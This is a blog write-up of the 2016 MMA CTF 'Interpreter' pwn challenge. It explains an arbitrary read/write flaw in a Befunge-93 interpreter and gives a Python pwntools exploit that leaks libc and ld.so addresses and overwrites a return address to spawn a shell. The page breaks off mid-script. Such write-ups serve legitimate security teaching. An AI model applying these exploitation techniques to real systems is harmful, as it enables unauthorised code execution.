<!doctype html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>






<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="CTF,Pwnable,Python,MMA," />





  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />






<meta name="description" content="Category: pwnPoints: 200">
<meta name="keywords" content="CTF,Pwnable,Python,MMA">
<meta property="og:type" content="article">
<meta property="og:title" content="MMA 2nd CTF 2016 -- Interpreter">
<meta property="og:url" content="https://bruce30262.github.io/2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/index.html">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:description" content="Category: pwnPoints: 200">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-01-03T15:08:05.595Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MMA 2nd CTF 2016 -- Interpreter">
<meta name="twitter:description" content="Category: pwnPoints: 200">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://bruce30262.github.io/2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/"/>





  <title>MMA 2nd CTF 2016 -- Interpreter | Hacking Tube 2.0</title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-100090256-1', 'auto');
  ga('send', 'pageview');
</script>












  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hacking Tube 2.0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Security and stuff.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Bruce Chen">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hacking Tube 2.0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">MMA 2nd CTF 2016 -- Interpreter</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-12T16:45:00+08:00">
                2016-09-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-eye"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
            </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>Category:</strong> pwn<br><strong>Points:</strong> 200  </p>
<a id="more"></a>  
<p>64 bit ELF, with <strong>FULL RELRO</strong>, <strong>NX</strong>, <strong>stack guard</strong> &amp; <strong>PIE</strong> enabled.<br>After doing some reversing, we found that it’s a <a href="https://en.wikipedia.org/wiki/Befunge" target="_blank" rel="noopener">Befunge-93 program</a> interpreter. It will first read some <a href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list" target="_blank" rel="noopener">Befunge-93 instructions</a> (at most 20000 characters), then interpret &amp; execute those instructions. The program will store those instructions at the <code>program</code> buffer, and the maximum of the executed instructions is 10000.  </p>
<p>Here’s the pseudo code of the main function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// here I only list some important features of the program</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Online Befunge(93) Interpreter"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please input your program."</span>);</span><br><span class="line">    program = read_program(); <span class="comment">// read user input to buffer 'program'</span></span><br><span class="line"></span><br><span class="line">    step = <span class="number">10001</span>;</span><br><span class="line">    row = <span class="number">0</span>, col = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        ins = program[<span class="number">80</span> * row + col]</span><br><span class="line">            <span class="keyword">switch</span> ( ins )</span><br><span class="line">            &#123;</span><br><span class="line">                .....<span class="comment">//other instruction...</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'&amp;'</span>: <span class="comment">// ask user for a number and push it to stack</span></span><br><span class="line">                    __isoc99_scanf(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">                    push(x);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'.'</span>: <span class="comment">// Pop value and output as an integer followed by a space</span></span><br><span class="line">                    x = pop();</span><br><span class="line">                    __printf_chk(<span class="number">1L</span>L, <span class="string">"%d "</span>, x);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    .....<span class="comment">//other instruction...</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'*'</span>:  <span class="comment">// pop x, y, push x*y</span></span><br><span class="line">                    a = pop();</span><br><span class="line">                    b = pop();</span><br><span class="line">                    push(a * b);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                        .....<span class="comment">//other instruction...</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">'g'</span>: <span class="comment">// (get) Pop x and y, then push ASCII value of the character at that position in the program</span></span><br><span class="line">                    x = pop();</span><br><span class="line">                    y = pop();</span><br><span class="line">                    push( (<span class="keyword">char</span>)(program[<span class="number">80</span> * x + y]) );</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'p'</span>: <span class="comment">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z</span></span><br><span class="line">                    x = pop();</span><br><span class="line">                    y = pop();</span><br><span class="line">                    z = pop();</span><br><span class="line">                    program[<span class="number">80</span> * x + y] = (<span class="keyword">char</span>)z;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">' '</span>: <span class="comment">// space = do nothing</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        --step;</span><br><span class="line">        <span class="comment">// update row &amp; column</span></span><br><span class="line">        <span class="comment">// do other stuff...</span></span><br><span class="line">    &#125;<span class="keyword">while</span> ( step );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too many steps. Is there any infinite loops?"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>After we took some good look at the main function, we found that we’re able to trigger the <strong>read/write anywhere</strong> vulnerability by doing the followings:  </p>
<ul>
<li>By using the <code>&amp;</code>, <code>g</code> and <code>.</code> instructions, we’re able to read the content of any memory address.  <ul>
<li>Use <code>&amp;</code> to push an integer on the <code>Stack</code> (notice the uppercase S, this <code>Stack</code> variable is a buffer that the interpreter use to simulate the stack in a Befunge-93 program).  </li>
<li>By doing <code>g</code>, the interpreter will first pop two values (let’s say <code>x</code> &amp; <code>y</code> ) from <code>Stack</code> and push the content of <code>program[80 * x + y]</code> to the <code>Stack</code>. Since we can control the value of <code>x</code> &amp; <code>y</code>, we can push the content of any address on Stack, and print it out by using the <code>.</code> instruction.  </li>
<li>Notice that the <code>&amp;</code> instruction only make us able to push an integer (32 bit) on the <code>Stack</code>. If we want to read the content that is far away from the <code>program</code> buffer, the value of <code>x</code> &amp; <code>y</code> might have to be an <strong>long integer</strong>. To solve this problem, we can use the <code>*</code> instruction. It will pop two values (<code>x</code> &amp; <code>y</code>) from the <code>Stack</code> and push <code>x * y</code> to <code>Stack</code>. It uses 64 bit registers during the whole operation, thus we can use this method to place a long integer on the <code>Stack</code>, then use <code>g</code> &amp; <code>.</code> to leak the content of any memory address.  </li>
</ul>
</li>
<li>With the aforementioned methods, we can also use the <code>p</code> instruction to overwrite the content of any memory address.</li>
</ul>
<p>So now we can leak and overwrite the content of whatever the memory address we want. The first thing we do is to leak the libc’s base address. Here I leak the address of <code>__libc_start_main</code>‘s GOT, and use <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a> to get the libc’s version.  </p>
<p>Now we’ll have to overwrite some address to hijack the control flow. Notice that there’s no function pointer in the program, and GOT were all read-only due to the FULL RELRO protection. The only way we can do this is to <strong>overwrite the return address.</strong>  </p>
<p>So now we’ll have to get the stack address. But how? There’s no format string vulnerability, so it’s hard (nearly impossible) for us to leak the saved ebp or argv address on the stack. Also there’s no <code>malloc</code> or <code>mmap</code>, so it’s also impossible for us to locate the .tls section address and leak the pointer to stack which is placed in the very section. </p>
<p>By the time I was solving this challenge, the only way left I know is to leak the <code>__libc_stack_end</code> symbol in the <code>ld-linux.so</code>. To achieve this I’ll have to leak the <code>ld-linux.so</code>‘s base address from the <code>DT_DEBUG</code> info, which is placed in the .dynamic section of the binary. As for the version of the <code>ld-linux.so</code>, I just assume it’s the same version with the libc.so, which is Ubuntu 14.04, 64bit. Luckily, the actual binary can be retrieved from my other VM. </p>
<p>It took me a lot of time and work to do the whole thing, and the method’s not elegant. Fortunately, it worked, and I was able to overwrite the return address with the typical x64 ROP chain: <code>pop_rdi --&gt; bin_sh --&gt;system</code>. At last, we are able to spawn a shell and get the flag.  </p>
<figure class="highlight python"><figcaption><span>exp_bef.py  </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"pwn1.chal.ctf.westerns.tokyo"</span> </span><br><span class="line">PORT = <span class="number">62839</span></span><br><span class="line">ELF_PATH = <span class="string">"./befunge_patch"</span></span><br><span class="line">LIBC_PATH = <span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_addr</span><span class="params">(s, f)</span>:</span> <span class="comment"># search string address in file</span></span><br><span class="line">    result = list(f.search(s+<span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_one_byte</span><span class="params">(off_1, off_80)</span>:</span></span><br><span class="line">    r.sendline(str(off_1))</span><br><span class="line">    r.sendline(str(off_80))</span><br><span class="line">    ret = r.recvuntil(<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(base, off_80, name=None)</span>:</span></span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(base, base+<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"leaking %s byte : %d"</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        ret = leak_one_byte(i, off_80)</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_offset</span><span class="params">(addr, text_base)</span>:</span></span><br><span class="line">    start_from = text_base + <span class="number">0x202040</span></span><br><span class="line">    offset = addr - start_from</span><br><span class="line">    off_80 = offset/<span class="number">80</span></span><br><span class="line">    off_1 = offset%<span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> off_1, off_80</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_far_addr</span><span class="params">(addr, text_base, name)</span>:</span></span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = int(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"leaking %s byte : %d"</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        r.sendline(str(i))</span><br><span class="line">        r.sendline(str(temp))</span><br><span class="line">        r.sendline(str(temp))</span><br><span class="line">        ret = int(r.recvuntil(<span class="string">" "</span>))</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_far_addr</span><span class="params">(addr, text_base, name, value)</span>:</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = int(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        v = (value&gt;&gt;(<span class="number">8</span>*cnt)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"writing %s byte %d : %x"</span> % (name, cnt+<span class="number">1</span>, v)</span><br><span class="line">        r.sendline(str(v))</span><br><span class="line">        r.sendline(str(i))</span><br><span class="line">        r.sendline(str(temp))</span><br><span class="line">        r.sendline(str(temp))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#LOCAL = True</span></span><br><span class="line">    LOCAL = <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct befunge-93 program</span></span><br><span class="line">    preline = myexec(<span class="string">"wc -l ./bbb | awk '&#123;print $1&#125;'"</span>)</span><br><span class="line">    preline = int(preline)</span><br><span class="line">    f = open(<span class="string">"./bbb"</span>, <span class="string">"r"</span>)</span><br><span class="line">    s = f.read()</span><br><span class="line">    s += <span class="string">"\n"</span>*(<span class="number">80</span>-preline)</span><br><span class="line">    </span><br><span class="line">    r, LD = <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">        LD = ELF(<span class="string">"/mnt/files/ld-linux-x86-64.so.2"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">        LD = ELF(<span class="string">"/lib64/ld-linux-x86-64.so.2"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send program</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, s)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    libc_main = leak_addr(<span class="number">-48</span>, <span class="number">-2</span>, <span class="string">"libc_main"</span>)</span><br><span class="line">    libc_base, system, bin_sh = <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="comment"># for local</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        libc.address += libc_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">        libc_base = libc.address</span><br><span class="line">        system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">        bin_sh = str_addr(<span class="string">"sh\x00"</span>, libc)</span><br><span class="line">    <span class="comment"># for remote</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        libc_base = libc_main - <span class="number">0x21e50</span></span><br><span class="line">        system = libc_base + <span class="number">0x0000000000046590</span></span><br><span class="line">        bin_sh = libc_base + <span class="number">0x17c8c3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak text base</span></span><br><span class="line">    text_base = leak_addr(<span class="number">-56</span>, <span class="number">-9</span>, <span class="string">"text_base"</span>)</span><br><span class="line">    text_base -= <span class="number">0xb00</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line">    log.info(<span class="string">"text_base: "</span>+hex(text_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak r_debug</span></span><br><span class="line">    r_debug = leak_addr(<span class="number">0</span>, <span class="number">-7</span>, <span class="string">"r_debug"</span>)</span><br><span class="line">    log.info(<span class="string">"r_debug: "</span>+hex(r_debug))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># traverse link_map structure &amp; leak ld-linux.so base address</span></span><br><span class="line">    link_map_addr = r_debug + <span class="number">8</span></span><br><span class="line">    link_map_text = leak_far_addr(link_map_addr, text_base, <span class="string">"link_map_text"</span>)</span><br><span class="line">    log.info(<span class="string">"link_map_text: "</span>+hex(link_map_text))</span><br><span class="line">    link_map_vdso = leak_far_addr(link_map_text+<span class="number">24</span>, text_base, <span class="string">"link_map_vdso"</span>)</span><br><span class="line">    log.info(<span class="string">"link_map_vdso: "</span>+hex(link_map_vdso))</span><br><span class="line">    link_map_libc = leak_far_addr(link_map_vdso+<span class="number">24</span>, text_base, <span class="string">"link_map_libc"</span>)</span><br><span class="line">    log.info(<span class="string">"link_map_libc: "</span>+hex(link_map_libc))</span><br><span class="line">    link_map_ld = leak_far_addr(link_map_libc+<span class="number">24</span>, text_base, <span class="string">"link_map_ld"</span>)</span><br><span class="line">    log.info(<span class="string">"link_map_ld: "</span>+hex(link_map_ld))</span><br><span class="line">    ld_base = leak_far_addr(link_map_ld, text_base, <span class="string">"ld_base"</span>)</span><br><span class="line">    log.info(<span class="string">"ld_base: "</span>+hex(ld_base))</span><br><span class="line">    <span class="comment"># leak __libc_stack_end in ld-linux.so, get stack address</span></span><br><span class="line">    LD.address += ld_base</span><br><span class="line">    log.info(<span class="string">"libc_stack_end: 